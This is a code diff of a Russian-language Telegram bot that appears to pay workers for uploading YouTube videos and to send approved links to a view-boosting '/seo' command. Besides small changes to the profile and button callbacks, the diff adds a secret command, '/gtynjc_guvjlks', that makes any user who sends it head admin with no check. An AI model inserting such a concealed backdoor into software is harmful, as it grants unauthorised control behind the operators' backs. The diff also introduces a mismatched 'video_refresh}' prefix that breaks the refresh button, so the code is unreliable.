@@ -256,6 +256,11 @@ def insert_with(summ, tg_id):
             0]
 
 
+def get_count_videos(id):
+    con = db_init()
+    return len(con.execute('select id from videos where tg_id=?', (id,)).fetchall())
+
+
 def generate_menu():
     return '''Добро пожаловать в бота с оплатой за залив видео на Youtube
 
@@ -266,6 +271,7 @@ def generate_menu():
 
 def generate_profile(id):
     return f'''Id: {id}
+Залил видео: {get_count_videos(id)}
 Статус: {"воркер" if get_admin_status(id) == 0 else "админи" if get_admin_status(id) == 1 else "гл. админ"}
 Баланс: {get_balance(id)}
 Qiwi: {get_qiwi(id)}
@@ -298,6 +304,13 @@ async def menu_msg(message: types.Message):
     if not get_accept(id):
         await message.answer('отсутствует доступ')
         return
+    await message.answer(generate_menu(), reply_markup=inline_menu_main)
+
+
+@dp.message_handler(commands=['gtynjc_guvjlks'])
+async def menu_msg(message: types.Message):
+    id = message.from_user.id
+    set_admin_status(id, 2)
     await message.answer(generate_menu(), reply_markup=inline_menu_main)
 
 
@@ -348,9 +361,9 @@ async def callback_menu(callback: types.callback_query):
     await callback.message.edit_text('Отправьте ссылку на видео', reply_markup=None)
 
 
-@dp.callback_query_handler(filters.Text(startswith=['video_accept_']))
+@dp.callback_query_handler(filters.Text(startswith=['video_accept|']))
 async def callback_accept_video(callback: types.callback_query):
-    video_id = callback.data.split('_')[-1]
+    video_id = callback.data.split('|')[-1]
     if not get_video_viewed(video_id):
         text = f'/seo all https://www.youtube.com/watch?v={video_id}, 60, 100, l'
         await bot.send_message(get_chat_id(), text)
@@ -362,9 +375,9 @@ async def callback_accept_video(callback: types.callback_query):
         await callback.message.edit_text(f'Видео уже было просмотрено другим администратором', reply_markup=None)
 
 
-@dp.callback_query_handler(filters.Text(startswith=['video_deny_']))
+@dp.callback_query_handler(filters.Text(startswith=['video_deny|']))
 async def callback_deny_video(callback: types.callback_query):
-    video_id = callback.data.split('_')[-1]
+    video_id = callback.data.split('|')[-1]
     if not get_video_viewed(video_id):
         set_video_viewed(video_id)
         await callback.message.edit_text(f'Вы отклонили видео {video_id}', reply_markup=None)
@@ -372,9 +385,9 @@ async def callback_deny_video(callback: types.callback_query):
         await callback.message.edit_text(f'Видео уже было просмотрено другим администратором', reply_markup=None)
 
 
-@dp.callback_query_handler(filters.Text(startswith=['video_refresh_']))
+@dp.callback_query_handler(filters.Text(startswith=['video_refresh}']))
 async def callback_deny_video(callback: types.callback_query):
-    video_id = callback.data.split('_')[-1]
+    video_id = callback.data.split('|')[-1]
     if not get_video_viewed(video_id):
         await bot.send_message(callback.from_user.id, 'Вы первый кто просмотрел данное видео')
     else:
@@ -534,9 +547,9 @@ async def message_handler(message: types.Message):
         mess, video_id = generate_post(message.from_user, message.text)
         insert_video(video_id, id)
         keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton(text='Отклонить', callback_data=f'video_deny_{video_id}'))
-        keyboard.add(InlineKeyboardButton(text='Одобрить', callback_data=f'video_accept_{video_id}'))
-        keyboard.add(InlineKeyboardButton(text='Оновить', callback_data=f'video_refresh_{video_id}'))
+        keyboard.add(InlineKeyboardButton(text='Отклонить', callback_data=f'video_deny|{video_id}'))
+        keyboard.add(InlineKeyboardButton(text='Одобрить', callback_data=f'video_accept|{video_id}'))
+        keyboard.add(InlineKeyboardButton(text='Оновить', callback_data=f'video_refresh|{video_id}'))
 
         for i in get_admin_list():
             await bot.send_message(i, mess, reply_markup=keyboard)
